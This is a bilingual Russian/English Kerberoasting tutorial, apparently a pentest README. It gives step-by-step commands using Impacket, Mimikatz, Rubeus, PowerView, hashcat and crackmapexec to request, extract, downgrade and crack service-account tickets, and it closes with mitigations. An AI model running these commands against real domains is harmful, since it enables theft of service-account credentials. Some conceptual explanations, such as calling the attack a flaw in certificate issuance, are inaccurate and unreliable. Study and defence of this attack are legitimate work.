# Kerberoasting RU
Что такое Kerberoasting? Kerberoasting - это атака на систему аутентификации Kerberos, которая используется в сетях Windows для обеспечения безопасности при аутентификации и авторизации пользователей и компьютеров. Атака Kerberoasting основывается на эксплуатации уязвимостей в процессе выдачи сертификатов для служб, работающих под учетными записями с использованием протокола Kerberos.В процессе атаки злоумышленник получает доступ к хэшам паролей сервисных аккаунтов, которые используются для запуска служб в среде Windows.<br>

**Необходимым условием для проведения атак Kerberoasting являются учетные данные пользователя домена (чистый текст или просто NTLM-хэш), оболочка в контексте пользователя домена или учетная запись типа SYSTEM. Как только мы получим этот уровень доступа, мы можем начинать. Мы также должны знать, какой узел в домене является контроллером домена**.<br>

Давайте разберемся, что такое Kerberos, SPN,ST  чтобы мы понимали, как работает GetUserSPNs, чтобы понять как при помощи Impacket, мы можешь эксплаутировать уязвимость Kerberoasting.<br>

Kerberos - это протокол аутентификации, который используется для защиты доступа к сетевым ресурсам в среде Active Directory.<br>
Он обеспечивает безопасность соединения между клиентом и сервером, путем шифрования информации об аутентификации, передаваемой по сети.<br>
Kerberos использует технологию криптографических ключей для проверки подлинности пользователей и служб. <br>
Когда пользователь запрашивает доступ к сетевому ресурсу, Kerberos генерирует билет безопасности, который подтверждает подлинность пользователя и разрешает доступ к ресурсу.<br>
В среде Active Directory Kerberos используется для аутентификации пользователей, между компьютерами, серверами и службами.<br>
<br>
SPN - это имя, которое идентифицирует учетную запись сервиса, например, базы данных или веб-сервера в сети Active Directory.<br>
Когда клиент запрашивает доступ к сервису, он должен знать SPN, чтобы установить безопасное соединение с сервисом.<br>
SPN также используется Kerberos, протоколом аутентификации в сети Active Directory, для выдачи учетных записей сервисов сервисным тикетам (ST), которые затем используются для аутентификации клиентов, запрашивающих доступ к сервисам.<br>
Наличие у учетной записи SPN означает, что для этой учетной записи может быть выдан сервисный тикет, который может быть использован для аутентификации клиентов<br>
<br>
Service Ticket (ST) - это билет, который выдается Kerberos-сервером клиенту, который запрашивает доступ к сервису. ST представляет собой криптографический токен, который содержит информацию об аутентификации клиента и разрешении на доступ к определенному сервису.<br>
ST используется для аутентификации клиента в службе, которую он запрашивает.<br> Он также используется для установления безопасного соединения между клиентом и службой, которая позволяет защитить данные от несанкционированного доступа.<br>
Поскольку ST содержит криптографически защищенную информацию об аутентификации клиента, он не может быть подделан или изменен без раскрытия криптографических ключей.<br>ST также имеет ограниченный срок действия, что делает его временным и не допускает его повторного использования в будущем.<br>ST - это один из ключевых элементов в аутентификации Kerberos, который обеспечивает безопасный доступ клиентов к сервисам в сети.<br>
<br>
Ticket (билет) - это основной элемент в протоколе аутентификации Kerberos. Ticket представляет собой криптографически защищенный токен, который выдается клиенту после успешной аутентификации и предоставления запрашиваемых прав доступа.
<br>
Ticket содержит информацию о пользователе, идентификаторе службы, времени и других параметрах, которые используются для аутентификации клиента и разрешения доступа к ресурсам. Ticket зашифрован с помощью симметричного ключа, который генерируется при каждой новой аутентификации и используется для защиты передаваемой информации.
<br>
Ticket представляет собой маркер безопасности, который используется для проверки подлинности пользователя и службы, а также для защиты передаваемых данных от несанкционированного доступа. Ticket имеет ограниченное время жизни и может использоваться только для одной сессии связи между клиентом и службой.
<br>
Kerberos использует Tickets для установления безопасного соединения между клиентом и службой, путем защиты передаваемой информации от несанкционированного доступа и подделки. Ticket является одним из ключевых элементов в протоколе аутентификации Kerberos и обеспечивает высокий уровень безопасности при передаче данных в сети.
<br>

## How to work GetUserSPNs
GetUserSPNs.py может использоваться для определения учетных записей пользователей, которые могут быть скомпрометированы с помощью уязвимости Kerberoasting. Инструмент сканирует учетные записи пользователей в домене Active Directory и выводит список учетных записей, у которых установлены SPN, а также информацию о сервисах, для которых они установлены.Затем, используя полученный список, он запрашивает Service Ticket (ST) для каждого SPN у Kerberos и извлекает хеши учетных записей. После чего злоумышленник может использовать его для атаки методом перебора паролей, чтобы получить пароль учетной записи пользователя.<br>
# Kerberoasting EN

What is Kerberoasting? Kerberoasting is an attack on the Kerberos authentication system, which is used on Windows networks to provide security when authenticating and authorizing users and computers. A Kerberoasting attack exploits vulnerabilities in the certificate-issuing process for services running under user accounts using the Kerberos protocol. The attacker gets access to the password hashes of the service accounts used to run the services in the Windows environment.<br>
**The prerequisite for a Kerberoasting attack is domain user credentials (clear text or just NTLM hashes), a shell in the context of a domain user or a SYSTEM type account.Once we have this level of access, we can begin. We must also know which node in the domain is the domain controller.**<br>

Let's understand what Kerberos, SPN,ST, Ticket, so that we understand how GetUserSPNs works, so that we understand how with Impacket, we can exploit a Kerberoasting vulnerability.

Kerberos is an authentication protocol used to secure access to network resources in an Active Directory environment.<br> 
It secures the connection between the client and the server by encrypting authentication information sent over the network.<br> 
Kerberos uses cryptographic key technology to authenticate users and services.<br>
When a user requests access to a network resource, Kerberos generates a security ticket that authenticates the user and authorizes access to the resource. <br>
In an Active Directory environment, Kerberos is used to authenticate users, between computers, servers and services. <br>
<br>
SPN is a name that identifies a service account, such as a database or web server on an Active Directory network.<br> 
When a client requests access to a service, it must know the SPN in order to establish a secure connection to the service.<br> 
SPN is also used by Kerberos, an authentication protocol on an Active Directory network, to issue service accounts to service tickets (STs), which are then used to authenticate clients requesting access to services.<br> 
Having an SPN on an account means that a service ticket can be issued for that account, which can then be used to authenticate clients.<br> 
<br>
Service Ticket (ST) is a ticket that is issued by the Kerberos server to a client that requests access to a service. An ST is a cryptographic token that contains information about the client's authentication and permission to access a particular service.<br> 
ST is used to authenticate the client to the service it requests.  It is also used to establish a secure connection between the client and the service, which helps protect data from unauthorized access.<br> 
Because ST contains cryptographically secure client authentication information, it cannot be tampered with or altered without revealing the cryptographic keys. ST also has a limited validity period, which makes it temporary and prevents it from being reused in the future. ST is one of the key elements in Kerberos authentication, which ensures secure client access to services on the network. <br>
<br> 
A Ticket is the basic element in the Kerberos authentication protocol. A Ticket is a cryptographically secure token that is issued to a client after successful authentication and the requested access rights have been granted.<br>
<br>
The Ticket contains information about the user, service identifier, time and other parameters that are used to authenticate the client and grant access to resources. The Ticket is encrypted using a symmetric key, which is generated with each new authentication and is used to protect transmitted information.<br>
<br> 
The Ticket is a security token that is used to authenticate the user and service and protect transmitted data from unauthorized access. A Ticket has a limited lifetime and can only be used for one communication session between a client and a service.
<br>
Kerberos uses Tickets to establish a secure connection between the client and service, by protecting the information being transmitted from unauthorized access and tampering. Ticket is one of the key elements in the Kerberos authentication protocol and provides a high level of security for data transmission over the network.<br>

## How to work GetUserSPNs EN

GetUserSPNs.py can be used to identify user accounts that might be compromised by a Kerberoasting vulnerability. The tool scans the user accounts in the Active Directory domain and retrieves a list of accounts with SPNs installed and also information about the services they are installed on.Then using this list it requests a Service Ticket (ST) for each SPN from Kerberos and retrieves the account hashes. The attacker can then use it for a brute force attack to get the password of the user account.<br>

## Explotation Kerberoating with Impacket

Listing SPN Accounts with Impacket
```
sudo impacket-GetUserSPNs -dc-ip 172.16.5.5 DOMAIN.LOCAL/william
```

Requesting all TGS Tickets
```
sudo impacket-GetUserSPNs -dc-ip 172.16.5.5 DOMAIN.LOCAL/william -request
```

Requesting a Single TGS ticket
```
sudo impacket-GetUserSPNs -dc-ip 172.16.5.5 DOMAIN.LOCAL/william -request-user sqldev
```

Saving the TGS Ticket to an Output File
```
sudo impacket-GetUserSPNs -dc-ip 172.16.5.5  DOMAIN.LOCAL/william -request-user sqldev -outputfile sqldev_tgs
```

Cracking the Ticket Offline with Hashcat
```
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

Testing Authentication against a Domain Controller
```
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

## Explotation Kerberoasting on Windows

Enumerating SPNs with setspn.exe
```
setspn.exe -Q */*
```

Targeting a Single User
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.domain.local:1433"
```

Retrieving All Tickets Using setspn.exe
```
setspn.exe -T DOMAIN.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Extracting Tickets from Memory with Mimikatz
```
.\mimikatz.exe "base64 /out:true" "kerberos::list /export" exit
```

Preparing the Base64 Blob for Cracking
```
echo "<base64 blob>" |  tr -d \\n | tee -a encoded_ticket
```

Placing the Output into a File as .kirbi
```
cat encoded_file | base64 -d > sqldev.kirbi
```

Extracting the Kerberos Ticket using kirbi2john
```
kirbi2john sqldev.kirbi | tee -a crack_file
```

Modifiying crack_file for Hashcat
```
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Cracking with HashCat
```
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

Using PowerView to Extract TGS Tickets
```
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

Using Rubeus
```
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

**RU:** Проверяя в PowerView, мы видим, что атрибут msDS-SupportedEncryptionTypes установлен в 0. Диаграмма здесь говорит нам, что десятичное значение 0 означает, что определенный тип шифрования не определен и установлен по умолчанию RC4_HMAC_MD5.<br>
**EN:** Checking in PowerView, we see that the msDS-SupportedEncryptionTypes attribute is set to 0. The diagram here tells us that a decimal value of 0 means that the specific encryption type is not defined and is set by default to RC4_HMAC_MD5.

Check msDS-SupportedEncryptionTypes attribute value with PowerView
```
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

Rubeus Kerberoasting RC4_HMAC 
```
.\Rubeus.exe kerberoast /user:testspn /nowrap
[*] Supported ETypes       : RC4_HMAC_DEFAULT

```

Crack RC4
```
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

Rubeus Kerberoasting AES128_CTS_HMAC_SHA1_96
```
.\Rubeus.exe kerberoast /user:testspn /nowrap
[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
```

Crack for aes128
```
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

**RU:** Мы можем использовать Rubeus с флагом /tgtdeleg, чтобы указать, что мы хотим использовать только шифрование RC4 при запросе нового билета. Инструмент делает это, указывая в теле запроса TGS шифрование RC4 как единственный поддерживаемый алгоритм. Это может быть защита от сбоев, встроенная в Active Directory для обратной совместимости. Используя этот флаг, мы можем запросить билет с шифрованием RC4, который может быть взломан гораздо быстрее.<br>
**EN:** We can use Rubeus with the /tgtdeleg flag to specify that we only want to use RC4 encryption when requesting a new ticket. The tool does this by specifying RC4 encryption as the only supported algorithm in the TGS request body. This can be a failover protection built into Active Directory for backward compatibility. Using this flag, we can request a ticket with RC4 encryption, which can be broken much faster.<br>

```
.\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
```

## How to Prevent

**RU:**<br>
Для защиты от этой атаки, можно использовать следующие рекомендации:
<ol>
<li>Ограничьте использование учетных записей служб. Учетные записи служб не должны использоваться для входа в систему интерактивно или сетево, их следует ограничить на те службы, для которых они предназначены.</li>
<li>Используйте длинные, сложные пароли для всех учетных записей. Чем сложнее пароль, тем сложнее его взломать методами брутфорса или словарных атак.</li>
<li>Ограничьте доступ к группам пользователей, которые имеют права на выполнение операций администрирования в Active Directory. Это позволит снизить риски, связанные с компрометацией учетных записей с высокими привилегиями.</li>
<li>Используйте инструменты мониторинга безопасности, такие как Microsoft Advanced Threat Analytics, чтобы обнаруживать атаки на Kerberos и другие уязвимости безопасности.</li>
<li>Обновляйте программное обеспечение и патчи операционной системы регулярно, чтобы убедиться в том, что уязвимости, связанные с Kerberos, не могут быть использованы для атак.</li>
</ol>
Более подробную информацию о защите от Kerberoasting можно найти в официальной документации Microsoft по :
<ol>
<li>https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview</li>
<li>https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-policy</li>
<li>https://learn.microsoft.com/ru-ru/windows/win32/ad/service-principal-names</li>
<li>https://attack.mitre.org/techniques/T1558/003/</li>
<li>https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-access-model</li>
</ol>

**EN:**<br>
To protect against this attack, you can use the following recommendations:
<ol>
<li>Restrict the use of service accounts. Service accounts should not be used to log in interactively or network-wise, they should be restricted to the services for which they are intended.</li>
<li>Use long, complex passwords for all accounts. The more complex the password, the more difficult it is to crack using bruteforce or dictionary attacks.</li>
<li>Restrict access to user groups that have permissions to perform administrative operations in Active Directory. This will reduce the risks associated with compromising accounts with high privileges.</li>
<li>Use security monitoring tools such as Microsoft Advanced Threat Analytics to detect attacks on Kerberos and other security vulnerabilities.</li>
<li>Update software and operating system patches regularly to ensure that Kerberos-related vulnerabilities cannot be exploited for attacks.</li>
</ol>
For more information about protecting against Kerberoasting, see Microsoft's official documentation on :
<ol>
<li>https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview</li>
<li>https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-policy</li>
<li>https://learn.microsoft.com/ru-ru/windows/win32/ad/service-principal-names</li>
<li>https://attack.mitre.org/techniques/T1558/003/</li>
<li>https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-access-model</li>
</ol>